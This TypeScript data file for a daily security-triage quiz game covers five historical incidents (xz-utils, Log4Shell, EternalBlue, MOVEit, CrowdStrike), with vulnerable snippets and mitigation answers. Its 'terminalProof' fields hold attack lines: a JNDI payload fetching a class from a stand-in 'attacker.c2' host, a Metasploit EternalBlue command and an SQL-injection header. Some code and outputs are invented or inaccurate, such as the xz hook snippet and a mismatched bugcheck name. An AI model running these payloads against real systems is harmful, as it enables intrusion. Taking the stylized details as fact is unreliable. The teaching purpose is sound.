import { SkillDomain } from '../types';

export interface DailyBreachIncident {
  id: string;
  dayIndex: number;
  title: string;
  cveId: string;
  threatActor: string;
  targetArchitecture: string;
  severity: 'CRITICAL' | 'HIGH' | 'MAXIMUM DEFCON';
  cvssScore: number;
  scenario: string;
  vulnerableCodeSnippet: string;
  codeLanguage: string;
  vulnerableLineNumber: number;
  prompt: string;
  options: {
    id: string;
    text: string;
    isCorrect: boolean;
    mitigation: string;
  }[];
  rootCauseAnalysis: {
    cwe: string;
    attackVector: string;
    historicalImpact: string;
    remediationPatch: string;
    terminalProof: string;
  };
  xpReward: number;
  eloReward: number;
}

export const DAILY_BREACHES: DailyBreachIncident[] = [
  {
    id: 'breach_xz_utils',
    dayIndex: 1,
    title: 'XZ Utils Supply Chain Backdoor',
    cveId: 'CVE-2024-3094',
    threatActor: 'Jia Tan (Advanced Persistent Threat / State-Sponsored)',
    targetArchitecture: 'OpenSSH (sshd) via liblzma on Debian/Fedora',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 10.0,
    scenario: 'A sophisticated backdoor injected into the xz-utils build infrastructure hooks `RSA_public_decrypt` in OpenSSH via GNU indirect function (IFUNC) to hijack authentication and execute unauthenticated arbitrary code before sshd reaches login.',
    codeLanguage: 'c',
    vulnerableLineNumber: 4,
    vulnerableCodeSnippet: `// xz-utils m4 macro injection hook
1: static void _lzma_hook_openssh_init(void) {
2:   void *handle = dlopen("liblzma.so.5", RTLD_NOW);
3:   // Hook RSA verification routine in sshd
4:   void **rsa_func = (void**)dlsym(handle, "RSA_public_decrypt");
5:   if (rsa_func) *rsa_func = (void*)&backdoor_magic_payload_exec;
6: }`,
    prompt: 'Which technique allowed the backdoor to modify OpenSSH authentication flow without altering sshd source code directly?',
    options: [
      {
        id: 'xz_1',
        text: 'Hooking IFUNC resolver during systemd-notify dynamic linking in sshd',
        isCorrect: true,
        mitigation: 'Eliminate external pre-linking dependencies from sshd and audit upstream source tarballs.'
      },
      {
        id: 'xz_2',
        text: 'Injecting a DKMS kernel driver at server boot time',
        isCorrect: false,
        mitigation: 'Not applicable: the attack executes entirely within user-mode dynamic linker ld.so.'
      },
      {
        id: 'xz_3',
        text: 'Exploiting a traditional stack buffer overflow in ssh-keygen',
        isCorrect: false,
        mitigation: 'This is a multi-stage supply chain injection, not a memory buffer overflow.'
      },
      {
        id: 'xz_4',
        text: 'Bypassing iptables firewalls via encapsulated GRE frames',
        isCorrect: false,
        mitigation: 'The vulnerability targets application-layer RSA verification, not network encapsulation.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-506: Embedded Malicious Code (Supply Chain Attack)',
      attackVector: 'M4 macros in release tarballs altered build stages to inject obfuscated object code into test .lzma files.',
      historicalImpact: 'Would have granted unauthorized root SSH access to millions of Linux servers worldwide if not spotted by engineer Andres Freund due to a 500ms latency anomaly.',
      remediationPatch: 'Immediate rollback to xz-utils 5.4.x and removal of libsystemd linking from OpenSSH binaries.',
      terminalProof: '$ ssh -i id_rsa -o "CertificateInvalid=..." target-server\n[DEBUG] Backdoor signature payload triggered: root shell spawned'
    },
    xpReward: 80,
    eloReward: 25
  },
  {
    id: 'breach_log4shell',
    dayIndex: 2,
    title: 'Log4Shell: Zero-Click JNDI / LDAP RCE',
    cveId: 'CVE-2021-44228',
    threatActor: 'Mass Internet Scanning & Ransomware Groups',
    targetArchitecture: 'Apache Log4j 2.x Java Application Framework',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 10.0,
    scenario: 'Log4j recursively evaluates expressions inside logged messages. When a log statement contains `${jndi:ldap://...}`, Log4j queries the remote LDAP server, downloading and dynamically executing an untrusted Java class.',
    codeLanguage: 'java',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `// Spring Boot Java Login Controller
1: @PostMapping("/login")
2: public ResponseEntity<?> login(@RequestHeader("User-Agent") String userAgent) {
3:     logger.info("Login attempt received from client: {}", userAgent);
4:     return ResponseEntity.ok("Handshake in progress");
5: }`,
    prompt: 'Which JVM runtime flag mitigates remote code execution via JNDI/LDAP as an immediate emergency workaround?',
    options: [
      {
        id: 'l4j_1',
        text: '-Dlog4j2.formatMsgNoLookups=true or removing JndiLookup.class',
        isCorrect: true,
        mitigation: 'Disables message lookups in log formats, preventing outbound JNDI queries.'
      },
      {
        id: 'l4j_2',
        text: '-Xmx4096m to allocate additional heap memory to the garbage collector',
        isCorrect: false,
        mitigation: 'Increasing memory allocation does not prevent remote class injection.'
      },
      {
        id: 'l4j_3',
        text: 'Setting HTTP Strict Transport Security (HSTS) to 31536000 seconds',
        isCorrect: false,
        mitigation: 'HSTS secures browser connections but does not sanitize backend log parsing.'
      },
      {
        id: 'l4j_4',
        text: 'Restarting Tomcat with chmod 777 permissions on /opt/tomcat',
        isCorrect: false,
        mitigation: 'Chmod 777 severely weakens local system security posture.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement',
      attackVector: 'String injection in HTTP headers (User-Agent, X-Forwarded-For) or input forms processed by logger.',
      historicalImpact: 'Impacted over 80% of global enterprise Java infrastructure (Apple, Amazon AWS, Steam, VMware).',
      remediationPatch: 'Mandatory upgrade to Log4j 2.17.1+ and disabling JNDI protocols by default.',
      terminalProof: '$ curl -H "User-Agent: \${jndi:ldap://attacker.c2/Exploit.class}" https://target.corp/\n[+] LDAP query received on port 1389: Payload delivered!'
    },
    xpReward: 80,
    eloReward: 25
  },
  {
    id: 'breach_eternalblue',
    dayIndex: 3,
    title: 'EternalBlue SMBv1 Remote Kernel Pool Corruption',
    cveId: 'CVE-2017-0144',
    threatActor: 'Equation Group (NSA) / Shadow Brokers / WannaCry',
    targetArchitecture: 'Windows SMBv1 Server Kernel Driver (srv.sys)',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 9.8,
    scenario: 'A discrepancy between 16-bit and 32-bit mathematical casting in handling SMB_COM_TRANSACTION2_SECONDARY triggers a buffer overflow in the Windows kernel non-paged pool (srv.sys), granting SYSTEM-level RCE.',
    codeLanguage: 'c',
    vulnerableLineNumber: 4,
    vulnerableCodeSnippet: `// SrvOs2FeaListSizeToNt() in srv.sys
1: ULONG SrvOs2FeaListSizeToNt(PFEALIST FeaList) {
2:   // Integer overflow in extended attribute list conversion
3:   USHORT listSize = FeaList->cbList;
4:   ULONG calculatedSize = (ULONG)listSize + 0x1000; // Integer Wrap-around!
5:   return calculatedSize;
6: }`,
    prompt: 'Which architectural network and OS configuration completely eliminates the EternalBlue attack surface?',
    options: [
      {
        id: 'eb_1',
        text: 'Permanently disabling SMBv1 and blocking inbound TCP ports 445 and 139 at the perimeter',
        isCorrect: true,
        mitigation: 'SMBv1 is an obsolete protocol; enforce modern encrypted SMBv3 only.'
      },
      {
        id: 'eb_2',
        text: 'Enabling Windows Defender Cloud Protection on port 80',
        isCorrect: false,
        mitigation: 'The exploit targets kernel SMB on port 445, not port 80.'
      },
      {
        id: 'eb_3',
        text: 'Enabling NTLMv1 instead of Kerberos on Domain Controllers',
        isCorrect: false,
        mitigation: 'NTLMv1 is insecure and unrelated to memory corruption in srv.sys.'
      },
      {
        id: 'eb_4',
        text: 'Broadening the subnet mask from /24 to /16 to isolate the gateway',
        isCorrect: false,
        mitigation: 'Expanding subnet size facilitates self-propagating wormable malware spread.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-190: Integer Overflow or Wraparound in Kernel Driver',
      attackVector: 'Malformed SMBv1 frames containing extended attributes (FEA List) with inconsistent sizes.',
      historicalImpact: 'Fueled the WannaCry and NotPetya ransomware pandemics, generating billions in global hospital and supply chain damages.',
      remediationPatch: 'Install Microsoft security bulletin MS17-010 and disable the `SMB1Protocol` Windows feature.',
      terminalProof: '$ msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.50; run"\n[+] Meterpreter session 1 opened (NT AUTHORITY\\SYSTEM)'
    },
    xpReward: 85,
    eloReward: 25
  },
  {
    id: 'breach_moveit',
    dayIndex: 4,
    title: 'MOVEit Transfer SQLi Pre-Auth Data Exfiltration',
    cveId: 'CVE-2023-34362',
    threatActor: 'Cl0p Ransomware Cartel (FIN11)',
    targetArchitecture: 'Progress MOVEit Transfer Web App (.NET / MySQL)',
    severity: 'CRITICAL',
    cvssScore: 9.8,
    scenario: 'An unsanitized HTTP header parameter in `guestaccess.aspx` enabled pre-authentication SQL Injection. Attackers altered session state to impersonate admin privileges and drop a stealth webshell (`human2.aspx`).',
    codeLanguage: 'csharp',
    vulnerableLineNumber: 3,
    vulnerableCodeSnippet: `// guestaccess.aspx handler in MOVEit.DMZ.ClassLib
1: string transactionId = Request.Headers["X-siLock-Transaction"];
2: if (!string.IsNullOrEmpty(transactionId)) {
3:     string query = "SELECT * FROM institutions WHERE InstID = '" + transactionId + "'";
4:     MySqlCommand cmd = new MySqlCommand(query, conn);
5:     MySqlDataReader reader = cmd.ExecuteReader();
6: }`,
    prompt: 'Which defensive programming principle would have prevented SQL payload execution in guestaccess.aspx?',
    options: [
      {
        id: 'mov_1',
        text: 'Strict use of Prepared Statements with strongly-typed parameters (MySqlParameter)',
        isCorrect: true,
        mitigation: 'Parameterized queries bind data to defined types, preventing quotes and SQL syntax hijacking.'
      },
      {
        id: 'mov_2',
        text: 'Encrypting the database disk volume with BitLocker',
        isCorrect: false,
        mitigation: 'BitLocker protects against physical disk theft, not online application-layer queries.'
      },
      {
        id: 'mov_3',
        text: 'Deploying self-signed TLS certificates signed with MD5 hashes',
        isCorrect: false,
        mitigation: 'MD5 is insecure and TLS transports SQL injection payloads unmodified.'
      },
      {
        id: 'mov_4',
        text: 'Stripping session cookies at the reverse proxy load balancer',
        isCorrect: false,
        mitigation: 'This vulnerability was pre-authentication and did not rely on pre-existing session cookies.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-89: SQL Injection in Unauthenticated Web Handlers',
      attackVector: 'Injecting SQL statements through user-controllable `X-siLock-Transaction` HTTP headers.',
      historicalImpact: 'Mass data exfiltration impacting hundreds of financial institutions, government agencies, and pension funds worldwide.',
      remediationPatch: 'Mandatory header sanitization and complete migration to parameterized queries in Entity Framework.',
      terminalProof: '$ curl -H "X-siLock-Transaction: 1\' OR 1=1--" https://transfer.corp/guestaccess.aspx\nHTTP/1.1 200 OK (Admin Session Token Forged)'
    },
    xpReward: 80,
    eloReward: 24
  },
  {
    id: 'breach_crowdstrike',
    dayIndex: 5,
    title: 'CrowdStrike Falcon Sensor IPC Null-Pointer Logic Fault',
    cveId: 'INCIDENT-2024-CS-01',
    threatActor: 'Channel File 291 Rapid Response Content Update',
    targetArchitecture: 'CSAgent.sys Kernel Driver on Windows 10/11 & Server',
    severity: 'MAXIMUM DEFCON',
    cvssScore: 9.9,
    scenario: 'The Falcon kernel sensor received `Channel File 291` containing 21 uninitialized logic fields. The `CSAgent.sys` driver dereferenced a null pointer into unmapped memory, triggering a PAGE_FAULT_IN_NONPAGED_AREA bugcheck (global BSOD).',
    codeLanguage: 'c',
    vulnerableLineNumber: 4,
    vulnerableCodeSnippet: `// CSAgent.sys Named Pipe Parser Routine
1: NTSTATUS EvaluateChannelRules(PCHANNEL_PACKET Packet) {
2:   PRULE_ENTRY Entry = Packet->RuleTable[Packet->ActiveRuleIndex];
3:   // Missing pointer sanity check before member access
4:   ULONG signatureId = Entry->SignaturePointer->Id; // NULL POINTER DEREFERENCE!
5:   return ProcessSignature(signatureId);
6: }`,
    prompt: 'Which ring-0 kernel Quality Assurance testing methodology prevents widespread outages from dynamic content updates?',
    options: [
      {
        id: 'cs_1',
        text: 'Formal schema input validation and staged ring-based canary deployments',
        isCorrect: true,
        mitigation: 'Roll out channel updates in progressive rings (0 -> 1 -> 2) and enforce bounds checking in driver parsers.'
      },
      {
        id: 'cs_2',
        text: 'Executing antivirus device drivers in user mode via Python interpreters',
        isCorrect: false,
        mitigation: 'EDR sensors require ring-0 hooks to monitor native syscalls in real time.'
      },
      {
        id: 'cs_3',
        text: 'Disabling Safe Mode across all enterprise Windows Server fleets',
        isCorrect: false,
        mitigation: 'Safe Mode was the primary mechanism allowing administrators to manually delete the offending channel file.'
      },
      {
        id: 'cs_4',
        text: 'Compiling kernel drivers without WHQL code signing integrity checks',
        isCorrect: false,
        mitigation: 'WHQL validates Microsoft code signing and kernel image integrity.'
      }
    ],
    rootCauseAnalysis: {
      cwe: 'CWE-476: NULL Pointer Dereference in Ring-0 Device Driver',
      attackVector: 'Dynamic distribution of unvalidated configuration content files to millions of enterprise endpoints simultaneously.',
      historicalImpact: '8.5 million Windows machines disabled in boot loops, grounding flights and disrupting healthcare facilities worldwide.',
      remediationPatch: 'Explicit verification `if (!Entry || !Entry->SignaturePointer) return STATUS_INVALID_DATA;` and staggered deployment waves.',
      terminalProof: 'CRITICAL_PROCESS_DIED: BugCheck 0x50 (PAGE_FAULT_IN_NONPAGED_AREA)\nArguments: ffff800000000000, 0000000000000000, fffff8012a4f1020, 0000000000000002'
    },
    xpReward: 85,
    eloReward: 25
  }
];

/**
 * Returns today's breach deterministically based on day of year.
 * Every user worldwide sees the exact same incident on the same day.
 */
export function getDailyBreachForDate(customDate?: string): DailyBreachIncident {
  const d = customDate ? new Date(customDate) : new Date();
  const startOfYear = new Date(d.getFullYear(), 0, 0);
  const diff = d.getTime() - startOfYear.getTime();
  const oneDay = 1000 * 60 * 60 * 24;
  const dayOfYear = Math.floor(diff / oneDay);

  const index = Math.abs(dayOfYear) % DAILY_BREACHES.length;
  return DAILY_BREACHES[index];
}

/**
 * Generates Wordle-style share text for social bragging & viral engagement.
 */
export function generateDailyBreachShareCard(
  incident: DailyBreachIncident,
  secondsTaken: number,
  isCorrect: boolean,
  currentStreak: number,
  userElo: number
): string {
  const dateStr = new Date().toISOString().slice(0, 10);
  const statusTag = isCorrect ? '[PASS]' : '[FAIL]';

  return `[ZeroDay] // Daily 0xBreach #${incident.dayIndex}
Date: ${dateStr} · ${incident.cveId}
${statusTag} Triage: ${isCorrect ? 'SUCCESS' : 'BREACH DETECTED'} (${secondsTaken.toFixed(1)}s)
Daily Incident Streak: ${currentStreak} days
Operational ELO: ${userElo}

Can you mitigate today's attack faster than me?
URL: https://zeroday.gg`;
}
